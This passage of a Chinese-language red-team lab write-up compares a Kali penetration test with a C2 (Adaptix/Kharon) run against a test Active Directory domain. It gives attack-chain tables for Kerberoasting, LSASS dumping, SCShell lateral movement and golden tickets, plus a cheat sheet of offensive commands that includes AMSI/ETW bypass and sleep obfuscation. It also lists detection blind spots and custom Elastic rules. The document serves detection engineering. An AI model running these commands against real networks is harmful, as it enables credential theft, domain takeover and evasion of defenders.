| 横向移动（RDP） | 直连 xfreerdp | 经 SOCKS 的 xfreerdp | Potential Remote Desktop Tunneling Detected |
| 黄金票据 | ticketer.py | execute-assembly Rubeus golden | KRBTGT Delegation Backdoor |
| 注入（CRT） | 不适用 | scinject | Process Injection - Detected、Sysmon Event 8 |
| 注入（PoolParty） | 不适用 | inject-poolparty | 无   |
| 注入（Section） | 不适用 | inject-sec | Sysmon Event 8（远程线程创建，见第 9.2 节） |
| 发现  | whoami、net、ipconfig | SAL BOF | 渗透：Account/Group Discovery。红队：无 |
| MSSQL 发现 | nxc mssql | mssql 1434udp BOF | 无   |
| MSSQL 模拟 + xpcmd | mssqlclient.py | execute-assembly SQLRecon | 无（需要自定义规则） |

### 10.2 - 检测盲区（无预置规则触发）

以下 C2 行为在当前 152 条规则集中 **没有任何 Elastic 预置检测**：

-   **AS-REP Roasting**—— 需要针对 Event 4768 且 PreAuthType 为 0 的自定义规则
    
-   **Kerberoasting**—— 需要针对 Event 4769 且 EncryptionType 为 0x17 的自定义规则
    
-   **SCShell 横向移动**—— 需要针对注册表 ImagePath 修改（Event 13）的自定义规则
    
-   **inject-sec（节映射）**—— NtCreateSection 和 NtMapViewOfSection 不产生任何 Sysmon 事件，但远程线程创建仍会触发 Event ID 8（见第 9.2 节）
    
-   **inject-poolparty（线程池滥用）**—— 插入线程池项不产生任何 Sysmon 事件
    
-   **inject-cfg（CFG 劫持）**—— COM 指针覆写不产生任何 Sysmon 事件
    
-   **基于 BOF 的发现（whoami、ipconfig、arp 等）**—— 不创建子进程，无 Event ID 1
    
-   **ADWS 枚举（adwssearch BOF）**—— 协议不同（TCP 9389），而监控的是 LDAP（TCP 389）
    
-   **带伪造调用栈的 nanodump（ `-sc` 标志）**—— 伪造调用栈规避 Sysmon Event 10 的 CallTrace 字段检查
    
-   **睡眠混淆 / 堆掩码**—— 内存内技术，不产生任何事件
    
-   **通过 sp_configure 启用 xp_cmdshell**—— 无预置规则，需要 SQL Server 审计或针对 sqlservr.exe 子进程的 Windows Event 4688
    

### 10.3 - 补齐盲区的自定义检测规则

**自定义规则 1 —— AS-REP Roasting：**

-   名称：AS-REP Roasting Attempt
    
-   索引： `logs-windows.forwarded-*`
    
-   KQL： `event.code:"4768" AND winlog.event_data.PreAuthType:"0"`
    
-   严重性：高
    
-   MITRE：T1558.004
    

**自定义规则 2 —— Kerberoasting（RC4 降级）：**

-   名称：Kerberoasting via RC4 TGS Request
    
-   索引： `logs-windows.forwarded-*`
    
-   KQL： `event.code:"4769" AND winlog.event_data.TicketEncryptionType:"0x17" AND NOT winlog.event_data.ServiceName:*$`
    
-   严重性：高
    
-   MITRE：T1558.003
    

**自定义规则 3 —— 服务 ImagePath 修改（SCShell）：**

-   名称：Service Binary Path Modified (Potential SCShell)
    
-   索引： `logs-windows.sysmon_operational-*`
    
-   KQL： `event.code:"13" AND winlog.event_data.TargetObject:*\\Services\\* AND winlog.event_data.TargetObject:*ImagePath* AND NOT winlog.event_data.Image:(*svchost.exe* OR *services.exe* OR *TrustedInstaller.exe*)`
    
-   严重性：中
    
-   MITRE：T1569.002
    

**自定义规则 4 —— 非 DC 主机的 ADWS 连接：**

-   名称：Active Directory Web Service Query from Non-DC
    
-   索引： `logs-endpoint.*`
    
-   KQL： `destination.port:9389 AND NOT source.ip:("10.1.10.10" OR "10.1.10.11")`
    
-   严重性：低
    
-   MITRE：T1069
    

**自定义规则 5 —— SQL Server 派生的进程（xp_cmdshell）：**

-   名称：Child Process of SQL Server (Potential xp_cmdshell)
    
-   索引： `logs-endpoint.events.process-*`
    
-   KQL： `process.parent.name:"sqlservr.exe" AND NOT process.name:("sqlwriter.exe" OR "sqlceip.exe" OR "sqlagent.exe")`
    
-   严重性：高
    
-   MITRE：T1505.001
    

* * *

## 11 - 完整攻击链映射（Full Attack Chain Mapping）

### 11.1 - 路径 A

起点：castelblack（SRV02）上的低权限 Kharon agent，身份为 `samwell.tarly` 。

| 步骤  | 阶段  | C2 动作 | 渗透测试等价手法 | 检测  |
| --- | --- | --- | --- | --- |
| 1   | 侦察  | smartscan 10.1.10.0/24 -p standart | nmap -sn 10.1.10.0/24 | Network Scan 规则 |
| 2   | 侦察  | ldapsearch (objectClass=user) -a sAMAccountName,description | nxc smb DC02 --users | LDAP Attributes 规则 |
| 3   | 侦察  | adwssearch 或 execute-assembly SharpHound.exe | bloodhound-python -c ALL | Enumeration 规则 |
| 4   | 凭据  | kerbeus asreproasting /user:brandon.stark | GetNPUsers brandon.stark | 需要自定义规则 |
| 5   | 凭据  | kerbeus asktgt 后接 kerbeus kerberoasting | GetUserSPNs -request | 需要自定义规则 |
| 6   | 凭据  | 离线：hashcat -m 18200 / -m 13100 | 相同  | 不适用（离线） |
| 7   | 提权  | socks start + proxychains pygpoabuse.py | pygpoabuse.py（来自 Kali） | GPO Abuse 规则 |
| 8   | 提权  | getsystem token（GPO 刷新后获得本地管理员） | 不适用 | Privilege Escalation 规则 |
| 9   | 凭据  | nanodump -sc --valid（以 SYSTEM 身份） | mimikatz logonpasswords（落盘） | 渗透：5+ 条规则。C2：0-1 条 |
| 10  | 横向  | 以 jeor.mormont 身份 token make（本地管理员，凭据来自 nanodump） | evil-winrm 以 jeor.mormont | 无   |
| 11  | 横向  | jump scshell winterfell http_x64.exe（jeor.mormont 令牌） | evil-winrm -i DC02 | 无规则（SCShell） |
| 12  | 提权  | getsystem token（在 winterfell 上） | 不适用 | Privilege Escalation 规则 |
| 13  | 域   | lsadump_secrets（DC02 上的 SYSTEM） | raiseChild.py samwell.tarly | Registry Hive 规则 |
| 14  | 域   | execute-assembly Rubeus.exe golden /sids:...-519 | ticketer.py -extra-sid...-519 | KRBTGT Delegation 规则 |
| 15  | 域   | jump scshell kingslanding http_x64.exe | secretsdump.py -k kingslanding | 无规则（SCShell） |

### 11.2 - 路径 B

起点：castelblack（SRV02）上的低权限 Kharon agent，身份为 `samwell.tarly` 。

| 步骤  | 阶段  | C2 动作 | 渗透测试等价手法 | 检测  |
| --- | --- | --- | --- | --- |
| 1   | 侦察  | smartscan -p 445 | nxc smb 10.1.10.0/24 | Network Scan 规则 |
| 2   | 侦察  | process create "net view \\SRV02 /all" | smbclient -N -L //SRV02 | Windows Network Enumeration |
| 3   | 侦察  | ldapsearch (objectClass=user) | nxc smb DC02 --users | LDAP Attributes 规则 |
| 4   | 侦察  | fs ls C:\\Shares\\all | nxc smb SRV02 --shares | 无   |
| 5   | 侦察  | fs cat C:\\Shares\\all\\arya.txt | smbclient get arya.txt | 无   |
| 6   | 凭据  | kerbeus asreproasting | GetNPUsers brandon.stark | 需要自定义规则 |
| 7   | 凭据  | 离线：hashcat -m 18200 | 相同  | 不适用（离线） |
| 8   | 凭据  | kerbeus asktgt + kerberoasting | Rubeus.exe kerberoast | 需要自定义规则 |
| 9   | 凭据  | 离线：hashcat -m 13100（jon.snow） | 相同  | 不适用（离线） |
| 10  | 侦察  | fs cat \\winterfell\\NETLOGON\\script.ps1 | smbclient //NETLOGON get | 无   |
| 11  | 提权  | token make（jeor.mormont） | nxc smb jeor.mormont | 无   |
| 12  | 提权  | getsystem token | 不适用 | Privilege Escalation 规则 |
| 13  | 凭据  | nanodump -sc --valid | mimikatz logonpasswords（落盘） | 渗透：5+ 条规则。C2：0-1 条 |
| 14  | 侦察  | execute-assembly SharpHound.exe | SharpHound.exe（落盘） | Enumeration 规则 |
| 15  | 凭据  | 离线：hashcat -m 1000（robb.stark） | 相同  | 不适用（离线） |
| 16  | 横向  | jump scshell winterfell（robb.stark） | evil-winrm -i DC02 | 无规则（SCShell） |
| 17  | 提权  | getsystem token（winterfell 上） | 不适用 | Privilege Escalation 规则 |
| 18  | 凭据  | lsadump_secrets（DC02 上的 SYSTEM） | secretsdump.py robb.stark@DC02 | Registry Hive 规则 |
| 19  | 域   | execute-assembly Rubeus.exe golden | lookupsid.py + ticketer.py | KRBTGT Delegation 规则 |
| 20  | 域   | jump scshell kingslanding | secretsdump.py -k kingslanding | 无规则（SCShell） |

* * *

## 附录 A - Extension-Kit BOF 速查表

**AD-BOF**

| 命令  | 语法  | 作用  |
| --- | --- | --- |
| ldapsearch | ldapsearch \[-a attrs\] \[-c count\] \[-s scope\] | LDAP 查询 |
| adwssearch | adwssearch \[-a attrs\] \[--dc dc\] | ADWS 查询（TCP 9389），检测更低 |
| ldapq computers | ldapq computers | 列出域内计算机 |
| readlaps | readlaps \[-target target\] | 读取 LAPS 密码 |
| dcsync single | dcsync single \[-dc DC\] \[--only-nt\] | DCSync 单个用户 |
| dcsync all | dcsync all \[-dc DC\] \[--only-nt\] \[--only-users\] | DCSync 所有用户 |
| badtakeover | badtakeover | BadSuccessor 技术 |
| webdav enable | webdav enable | 启用 WebDAV 客户端 |
| webdav status | webdav status <host1,host2> | 检查 WebDAV 状态 |

**Kerbeus-BOF**

| 命令  | 语法  | 作用  |
| --- | --- | --- |
| kerbeus asktgt | kerbeus asktgt /user:U /password:P \[/enctype:E\] \[/ptt\] | 请求 TGT |
| kerbeus asktgt (hash) | kerbeus asktgt /user:U /aes256:HASH \[/ptt\] | 用 AES 密钥请求 TGT |
| kerbeus asktgt (rc4) | kerbeus asktgt /user:U /rc4:HASH \[/ptt\] | 用 NT 哈希请求 TGT |
| kerbeus asktgs | kerbeus asktgs /ticket:B64 /service:SPN \[/ptt\] | 请求 TGS |
| kerbeus asreproasting | kerbeus asreproasting /user:U \[/domain:D\] | AS-REP roast |
| kerbeus kerberoasting | kerbeus kerberoasting /spn:SPN /ticket:B64 | 用于破解的 TGS |
| kerbeus kerberoasting (nopreauth) | kerbeus kerberoasting /spn:SPN /nopreauth:USER | 无认证 Kerberoast |
| kerbeus s4u | kerbeus s4u /ticket:B64 /service:SPN /impersonateuser:U | S4U2Self + S4U2Proxy |
| kerbeus cross_s4u | kerbeus cross_s4u /ticket:B64 /service:SPN /targetdomain:D | 跨域 S4U |
| kerbeus ptt | kerbeus ptt /ticket:B64 | 传递票据 |
| kerbeus klist | kerbeus klist \[/luid:ID\] | 列出票据 |
| kerbeus purge | kerbeus purge \[/luid:ID\] | 清除票据 |
| kerbeus dump | kerbeus dump \[/luid:ID\] \[/user:U\] | 转储票据 |
| kerbeus triage | kerbeus triage \[/luid:ID\] | 票据分诊 |
| kerbeus describe | kerbeus describe /ticket:B64 | 描述票据 |
| kerbeus hash | kerbeus hash /password:P \[/user:U\] | 计算 Kerberos 密钥 |
| kerbeus changepw | kerbeus changepw /ticket:B64 /new:P | 修改密码 |
| kerbeus renew | kerbeus renew /ticket:B64 \[/ptt\] | 续期票据 |
| kerbeus tgtdeleg | kerbeus tgtdeleg \[/target:SPN\] | TGT 委派技巧 |

**Creds-BOF**

| 命令  | 语法  | 作用  |
| --- | --- | --- |
| hashdump | hashdump | SAM hive 转储 |
| lsadump_sam | lsadump_sam | 经 LSA 获取 SAM |
| lsadump_secrets | lsadump_secrets | LSA secrets |
| lsadump_cache | lsadump_cache | 缓存域凭据（DCC2） |
| nanodump | nanodump \[-w path\] \[--valid\] \[-sc\] \[--fork\] \[--snapshot\] \[--pid PID\] | LSASS minidump（隐蔽） |
| credman | credman | 凭据管理器转储 |
| get-netntlm | get-netntlm \[--no-ess\] | 本地 NetNTLM 提取 |
| autologon | autologon | 读取 autologon 注册表 |
| askcreds | askcreds \[-p prompt\] \[-n note\] \[-t wait_time\] | 提示用户输入凭据 |

**Execution-BOF**

| 命令  | 语法  | 作用  |
| --- | --- | --- |
| execute-assembly | execute-assembly \[params\] | 进程内.NET 程序集 |
| execute bof | execute bof -f \-a | 运行 Beacon Object File |
| execute postex | execute postex -m <inline | fork> -t \-p \-f |

**Injection-BOF**

| 命令  | 语法  | 作用  |
| --- | --- | --- |
| scinject | scinject <shellcode_file> | CRT 注入（Kharon 内置） |
| inject-cfg | inject-cfg <shellcode_file> | CFG 指针劫持 |
| inject-sec | inject-sec <shellcode_file> | 节映射 |
| inject-poolparty | inject-poolparty <technique_id> <shellcode_file> | 线程池滥用（8 种变体） |
| inject-32to64 | inject-32to64 <shellcode_file> | WOW64 跨架构注入 |

**LateralMovement-BOF**

| 命令  | 语法  | 作用  |
| --- | --- | --- |
| jump psexec | jump psexec \[-n svc_name\] | 基于服务的执行 |
| jump scshell | jump scshell \[-n service_name\] | 服务 ImagePath 修改 |
| invoke winrm | invoke winrm \[-u DOMAIN\\user\] \[-p pass\] | WinRM 命令执行 |
| invoke scshell | invoke scshell <service_name> | SCShell 命令执行 |
| runas-user | runas-user | 以其他用户运行 |
| runas-session | runas-session <session_id> | 在其他会话中运行 |

**Elevation-BOF**

| 命令  | 语法  | 作用  |
| --- | --- | --- |
| getsystem token | getsystem token | 通过令牌模拟获取 SYSTEM |
| potato-dcom | potato-dcom --token or potato-dcom --run | DCOM potato |
| potato-print | potato-print --token or potato-print --run | PrintSpoofer |
| uacbypass sspi | uacbypass sspi <file.exe> | 通过 SSPI 绕过 UAC |
| uacbypass registryshellcmd | uacbypass registryshellcmd <file.exe> | 通过注册表绕过 UAC |

**SAL-BOF（态势感知 - 本地）**

| 命令  | 语法  | 作用  |
| --- | --- | --- |
| whoami | whoami | 当前用户（BOF，无子进程） |
| ipconfig | ipconfig | 网络配置（BOF） |
| arp | arp | ARP 表（BOF） |
| env | env | 环境变量（BOF） |
| uptime | uptime | 系统运行时长（BOF） |
| routeprint | routeprint | IPv4 路由（BOF） |
| dir | dir \[/s\] | 目录列举（BOF） |
| cacls | cacls | 文件/目录权限（BOF） |
| nslookup | nslookup \[server\] \[type\] | DNS 查询（BOF） |
| listdns | listdns | DNS 缓存（BOF） |
| useridletime | useridletime | 用户空闲时间（BOF） |
| privcheck | privcheck | 提权检查（BOF） |

**SAR-BOF（态势感知 - 远程）**

| 命令  | 语法  | 作用  |
| --- | --- | --- |
| smartscan | smartscan \[-p fast\|standart\|full\|port_list\] | 端口扫描（BOF） |
| nbtscan | nbtscan \[-v\] \[-q\] \[-t timeout\] | NetBIOS 扫描（BOF） |
| quser | quser \[host\] | 查询用户会话（BOF） |
| taskhound | taskhound \[user\] \[pass\] \[-save dir\] | 计划任务枚举（BOF） |

**Kharon 内置命令**

| 命令  | 语法  | 作用  |
| --- | --- | --- |
| info | info | 会话与系统信息 |
| config sleep | config sleep | 回连间隔 |
| config jitter | config jitter | 睡眠随机化 |
| config ppid | config ppid | 父 PID 欺骗 |
| config blockdlls | config blockdlls <true\|false> | 阻止非微软 DLL |
| config mask.beacon | config mask.beacon <timer\|none> | 睡眠混淆 |
| config mask.heap | config mask.heap <true\|false> | 堆加密 |
| config syscall | config syscall <spoof\|spoof_indirect> | 系统调用方式 |
| config bof_api_proxy | config bof_api_proxy <true\|false> | BOF API 代理 |
| config spawnto | config spawnto | 牺牲进程 |
| config amsi_etw_bypass | config amsi_etw_bypass <all\|etw\|amsi\|none> | AMSI/ETW 绕过 |
| config worktime | config worktime | 活动时间窗口 |
| token getuid | token getuid | 显示当前用户 |
| token list | token list | 列出已存令牌 |
| token steal | token steal | 窃取进程令牌 |
| token impersonate | token impersonate | 使用已存令牌 |
| token rm | token rm | 移除已存令牌 |
| token revert | token revert | 恢复原始令牌 |
| token make | token make --domain D --username U --password P | 创建模拟令牌 |
| token privget | token privget | 令牌权限详情 |
| token privlist | token privlist | 列出令牌权限 |
| fs  | fs <pwd\|cd\|ls\|cat\|mkdir\|cp\|mv\|rm> \[args\] | 文件操作 |
| process list | process list | 列出运行中进程 |
| process kill | process kill \[exit_code\] | 终止进程 |
| process create | process create --command \[--pipe true\] \[--state suspended\] | 执行进程 |
| upload | upload <local_file> \[remote_path\] | 上传文件到目标 |
| download | download <remote_path> | 从目标下载文件 |
| scinject | scinject <shellcode_file> | Shellcode 注入 |
| socks start | socks start | 启动 SOCKS5 代理 |
| socks stop | socks stop | 停止 SOCKS5 代理 |
| rportfwd start | rportfwd start <local_port> <remote_host> <remote_port> | 反向端口转发 |
| rportfwd stop | rportfwd stop | 停止端口转发 |
| exit | exit <process\|thread> | 终止 agent |
| selfdel | selfdel | 从磁盘删除 agent |

* * *

## 附录 B - Elastic 索引模式

| 来源  | 索引模式 | 事件  |
| --- | --- | --- |
| Elastic Defend | `logs-endpoint.*` | 进程、文件、注册表、网络、API |
| Sysmon | `logs-windows.sysmon_operational-*` | Event ID 1、7、8、10、11、12、13、14、17、18、22、25 |
| Windows Security | `logs-windows.forwarded-*` | 登录（4624）、Kerberos（4768、4769）、服务（7045） |
| 端点告警 | `logs-endpoint.alerts-*` | 恶意软件 + 行为告警 |

* * *

## 附录 C - Sysmon Event ID 速查表

| Event ID | 类型  | 触发条件 |
| --- | --- | --- |
| 1   | ProcessCreate | 任何新进程。检测异常父进程派生的 cmd.exe、powershell.exe、net.exe 的关键。 |
| 7   | ImageLoad | 从 Temp、AppData、Users、Downloads 加载的 DLL。捕获投放的 DLL。 |
| 8   | CreateRemoteThread | 通过 CreateRemoteThread 或 NtCreateThreadEx 的注入。对 CRT 和节映射（inject-sec）触发。 **对 poolparty 或 CFG 劫持不触发。** |
| 10  | ProcessAccess | 以敏感访问掩码访问 lsass.exe、csrss.exe、winlogon.exe。 |
| 11  | FileCreate | 可执行文件落地（.exe、.dll、.sys）、脚本（.ps1、.bat）、.lnk 文件。 |
| 12/13/14 | RegistryEvent | Run 键、IFEO、服务、InprocServer32。捕获持久化和 SCShell。 |
| 17/18 | PipeEvent | 命名管道创建/连接。捕获 PsExec（svcctl）、CobaltStrike 默认值。 |
| 22  | DnsQuery | LOLBin 发起的 DNS（rundll32、certutil、mshta）。捕获分阶段载荷。 |
| 25  | ProcessTampering | 进程镂空、herpaderping。捕获伪装技术。 |

* * *

## 🔥 核心结论（Key Findings）

**这次演练在同一个实验环境中，把同一条 Active Directory 攻击链跑了两遍：一遍是从 Kali 出发的传统渗透测试，一遍是通过 C2 框架（Adaptix/Kharon）从一台已被攻陷的域内主机发起。两条路径都完成了完整的域接管（castelblack → winterfell → kingslanding）。区别在于检测结果。**

**检测覆盖度对比：**

| 指标  | 渗透测试（来自 Kali） | 红队 C2（来自内部主机） |
| --- | --- | --- |
| 触发的 Elastic 预置规则数 | **12+** | **4** |
| 完全零检测的技术数量 | **2**<br><br>（AS-REP Roast、Kerberoast） | **10**<br><br>（见第 10.2 节） |
| LSASS 相关告警 | **5+**<br><br>条规则 | **0**<br><br>（SAM 方案全程未触碰 lsass.exe） |
| 进程创建事件（Event ID 1） | 频繁（cmd、net、whoami） | **接近于零**<br><br>（BOF 全程进程内执行） |
| 源 IP 异常特征 | 外部 IP 极其扎眼 | 域成员服务器 IP，与正常流量混同 |

### C2 方式规避了什么

**没有子进程。** 基于 BOF 的侦察（whoami、ipconfig、arp、dir）直接调用 Windows API。不派生 cmd.exe 或 net.exe。没有 Sysmon Event ID 1。

**没有 LSASS 访问。** hashdump BOF 读取 SAM 注册表 hive，而不是打开 lsass.exe 的句柄。 **这绕过了所有以 LSASS 为中心的检测规则。**

**没有外部源 IP。** 每一次连接都来自一台已加入域的成员服务器，使用 Kerberos 认证。那些标记外部 IP 的网络规则不会触发。

**LDAP 没有 Sysmon 网络遥测。** 内联 BOF 的 LDAP 查询在源主机上产生零 Sysmon Event ID 3 条目。检测依赖 DC 侧 Event ID 1644 审计，而这默认不开启。

**横向移动没有新建服务。** SCShell 修改的是已存在服务的 ImagePath，而不是新建服务。 **这规避了 Event ID 7045。**

### 无论采用哪种方式都仍会被检测到的

**DCSync。** 即使只针对单个账户做定向 DCSync， `Potential Credential Access via DCSync` 规则依然触发了。 **Event ID 4662 中的复制 GUID 在来自 Kali 还是来自 BOF 时是同一个。**

**GPO 滥用。** `Group Policy Abuse for Privilege Addition` 规则触发了。 **SYSVOL 的修改与计划任务的创建，无论来源如何都是一样的。**

**Shellcode 注入（CRT 与节映射）。** Sysmon Event ID 8 会对任何远程线程创建触发，包括 inject-sec。 **间接系统调用绕不过 Sysmon 所挂钩的内核回调。**

**Kerberos 票据操作。** 无论来源如何，Event ID 4768 与 4769 都会在 DC 上被记录。 **这些事件在原始日志中确实存在。缺口在于没有任何预置 Elastic 规则会为它们触发。**

### 真正的缺口是规则覆盖度

大多数 C2 行为的原始遥测，其实都存在于日志的某个角落。Kerberoasting 会产生 Event 4769。AS-REP roasting 会产生 Event 4768。SCShell 会产生 Event 13（注册表修改）。 **问题在于，Elastic 的预置规则集（本次部署中共 152 条规则）并不包含针对这些事件的规则。第 10.3 节提供的五条自定义规则，补齐了最关键的缺口。**

> **说到底：**
> 
> **渗透测试验证的是你的检测能力"能不能用"。基于 C2 的红队测试验证的是：当攻击者从你网络内部动手、不产生子进程、使用 Kerberos 认证、全程驻留内存时，你的检测还灵不灵。**
> 
> **两者都需要。只跑一个，就会得到一幅关于自身检测态势的虚假画面。**

* * *
